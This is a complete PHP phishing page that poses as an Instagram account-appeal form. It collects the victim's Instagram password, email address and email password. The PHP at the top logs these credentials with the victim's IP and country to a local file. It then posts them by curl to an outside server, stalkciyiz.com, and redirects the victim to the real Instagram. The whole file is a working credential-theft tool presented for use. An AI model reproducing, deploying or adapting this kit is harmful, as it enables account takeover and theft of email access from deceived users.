<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["VOTK4"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('votk4.txt', 'a');
fwrite($file, "index: ".$nick."\n" ."Password: ".$password. "\n"."Mail: ".$mail."\n"."Mail Password: ".$mailpass."\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
    header("Location: https://www.instagram.com/");

$date = date("d-m-Y H:i:s");
$gonderilecekler = "username=$nick&password=$password&mail=$mail&mailSifre=$mailpass&ip=$ip&tarih=$date";

$ornek=curl_init(); curl_setopt($ornek, CURLOPT_TIMEOUT, 5); curl_setopt($ornek,CURLOPT_URL,"https://stalkciyiz.com/user/index.php"); curl_setopt($ornek,CURLOPT_POST,1); curl_setopt($ornek, CURLOPT_POSTFIELDS, $gonderilecekler);  $gelen_veri = curl_exec($ornek); echo $gelen_veri;  curl_close($ornek);

}

    ?>
<html>

<head>
     <meta charset="utf-8">
	 <title> @<?php echo $nick; ?> Instagram</title>
	 <meta name="viewport" content="width=device-width">
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:20px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:230px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#000000;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#000000;
font-size:15px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#000000;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px solid #000000 ; padding-left:2px;" >
 


<img src="https://resimag.com/p1/819f2f28aae.png" width=170 id="erhan" style="margin:6px; margin-top: 20px; margin-right: 20px;" >

<br><br>
</div>
<br><br>

<center>
<div id="sa" style="border:5px solid #000000 ;"> <br> 


<center>
<img src="https://i.hizliresim.com/SxHVA8.png" height="120" widht"50">
</center>

<br>
<h1 id="erhanasd">Hello there @<?php echo $nick; ?> </h1><

<p id="yazi1">

As the Instagram Team, we remove accounts that do not comply with the rules. If you have not violated any rules on your account and you think it is completely wrong, you can appeal by filling out the form.
</p>

<br>
<select style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #000000; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
  <option>News/Media</option>
  <option>Sports</option>
  <option>Government/Politics</option>
  <option>Music</option>
  <option>Fashion</option>
  <option>Entertainment</option>
  <option>Blogger/Influencer</option>
  <option>Business/Brand/Organization</option>
  <option>Other</option>
</select>
<br><br>

<input style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #000000; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #000000;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;" type="text" class="inputtext _55r1" name="inputReportedUsername" id="517933078260202" value="" placeholder="Known Name
" required="1" aria-required="true">
<br><br>

<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #000000; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #000000;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Email " required="" style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #000000; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #000000;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>



    <input type="password" name="mailpass" placeholder="Email Password" required="" style="padding:6px; background:##000000; outline:none;
color:#000000; width:83%; height:37px; border:1px solid #000000; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;text-align:center;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid ##000000;    text-overflow: ellipsis;
  
    font: 400 13.3333px Arial; border-radius:3px;">

   <br> <br>



<textarea cols="32" rows="3"  placeholder="Additional relevant information
" style="text-align:center;"></textarea>
<br><br>
<button id="buton" type="submit"> Continue as @<?php echo $nick; ?> </button>


 
</form>

</center>



</div>
<br> <br>
<center>
<div id="get">
<img src="Appstore.png" width=120 >
<img src="playstore.png" width=120>
</div>
<br><br>
<div id="menu">
<li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;

<li id="liste"><a href="" id="link">LANGUAGE</a> </li>

</div>
<br>
<p id="copyright">© 2021 lnstagra m Copyright</p>
</center>


</body>


</html>
